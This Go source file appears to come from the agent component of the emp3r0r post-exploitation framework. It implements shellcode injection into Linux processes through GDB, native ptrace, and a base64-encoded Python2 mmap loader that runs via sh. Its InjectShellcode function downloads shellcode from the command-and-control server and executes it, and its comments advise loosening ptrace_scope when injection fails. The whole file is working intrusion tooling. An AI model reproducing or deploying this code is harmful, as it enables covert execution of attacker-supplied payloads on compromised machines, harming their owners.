package agent

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"strconv"
	"strings"
	"syscall"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

// gdbInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
// FIXME does not work
func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}

// pyShellcodeLoader pure python, using ptrace
func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
	if !IsCommandExist("python2") {
		return fmt.Errorf("python2 is not found, shellcode loader won't work")
	}

	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "\\x", -1)

	// python2 shellcode loader template
	pyloader := fmt.Sprintf(`
import ctypes
import sys
from ctypes.util import find_library

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0X02
MAP_ANONYMOUS = 0X20
ENOMEM = -1

SHELLCODE = "%s"

libc = ctypes.CDLL(find_library('c'))

mmap = libc.mmap
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
				 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
mmap.restype = ctypes.c_void_p

page_size = ctypes.pythonapi.getpagesize()
sc_size = len(SHELLCODE)
mem_size = page_size * (1 + sc_size/page_size)

cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0)

if cptr == ENOMEM:
	sys.exit("mmap")

if sc_size <= mem_size:
	ctypes.memmove(cptr, SHELLCODE, sc_size)
	sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
	call_sc = ctypes.cast(cptr, sc)
	call_sc(None)
`, *shellcode)

	encPyloader := tun.Base64Encode(pyloader)
	cmd := fmt.Sprintf(`echo "exec('%s'.decode('base64'))"|python2`, encPyloader)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		log.Printf("python2 shellcode loader: %v\n%s", err, out)
		return fmt.Errorf("pyloader: %v\n%s", err, out)
	}
	log.Printf("python2 loader has loaded %d of shellcode: %s", shellcodeLen, out)

	return nil
}

// goShellcodeLoader pure go, using ptrace
func goShellcodeLoader(shellcode *string) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// start a child process to inject shellcode into
	sec := strconv.Itoa(RandInt(10, 30))
	child := exec.Command("sleep", sec)
	child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
	err = child.Start()
	if err != nil {
		return fmt.Errorf("Start `sleep 5`: %v", err)
	}
	childPid := child.Process.Pid

	// attach
	err = child.Wait() // TRAP the child
	if err != nil {
		log.Printf("child process wait: %v", err)
	}
	log.Printf("goShellcodeLoader: attached to %d", childPid)

	// read RIP
	regs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(childPid, regs)
	if err != nil {
		return fmt.Errorf("read regs from %d: %v", childPid, err)
	}
	rip := regs.Rip
	log.Printf("goShellcodeLoader: got RIP (0x%x) of %d", rip, childPid)

	// write shellcode to .text section, where RIP is pointing at
	n, err := syscall.PtracePokeText(childPid, uintptr(rip), sc)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), childPid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(sc))
	n, err = syscall.PtracePeekText(childPid, uintptr(rip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", rip)
	}
	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)

	// continue and wait
	err = syscall.PtraceCont(childPid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(childPid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}
	// what happened to our child?
	switch {
	case ws.Continued():
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(childPid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", childPid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
	case ws.Exited():
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(childPid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", childPid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
	case ws.Stopped():
		err = syscall.PtraceGetRegs(childPid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", childPid, err)
		}
		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
	default:
		err = syscall.PtraceGetRegs(childPid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", childPid, err)
		}
		log.Printf("continue: RIP at 0x%x", regs.Rip)
	}

	return nil
}

// Injector inject shellcode to a running process using ptrace
// target process will be restored after shellcode has done its job
// TODO
func Injector(pid int, shellcode *string) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// inject to an existing process or start a new one
	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
	if pid == 0 {
		// start a child process to inject shellcode into
		sec := strconv.Itoa(RandInt(10, 30))
		child := exec.Command("sleep", sec)
		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
		err = child.Start()
		if err != nil {
			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
		}
		pid = child.Process.Pid

		// attach
		err = child.Wait() // TRAP the child
		if err != nil {
			log.Printf("child process wait: %v", err)
		}
		log.Printf("Injector: attached to child process (%d)", pid)
	} else {
		// start a child process to inject shellcode into
		err = syscall.PtraceAttach(pid)
		if err != nil {
			return fmt.Errorf("ptrace attach: %v", err)
		}
		log.Printf("Injector: attached to %d", pid)
	}

	// read RIP
	regs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, regs)
	if err != nil {
		return fmt.Errorf("read regs from %d: %v", pid, err)
	}
	rip := regs.Rip
	log.Printf("Injector: got RIP (0x%x) of %d", rip, pid)

	// write shellcode to .text section, where RIP is pointing at
	n, err := syscall.PtracePokeText(pid, uintptr(rip), sc)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), pid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(sc))
	n, err = syscall.PtracePeekText(pid, uintptr(rip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", rip)
	}
	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)

	// continue and wait
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}

	// what happened to our child?
	switch {
	case ws.Continued():
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(pid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
	case ws.Exited():
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(pid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
	case ws.Stopped():
		err = syscall.PtraceGetRegs(pid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
	default:
		err = syscall.PtraceGetRegs(pid, regs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("continue: RIP at 0x%x", regs.Rip)
	}

	return nil
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	// prepare the shellcode
	shellcodeFile := AgentRoot + "/shellcode.txt"
	err = DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
	if err != nil {
		return
	}
	sc, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcode := string(sc)
	shellcodeLen := strings.Count(string(shellcode), "0x")

	// dispatch
	switch method {
	case "gdb":
		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
	case "native":
		err = goShellcodeLoader(&shellcode)
	case "python":
		err = pyShellcodeLoader(&shellcode, shellcodeLen)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
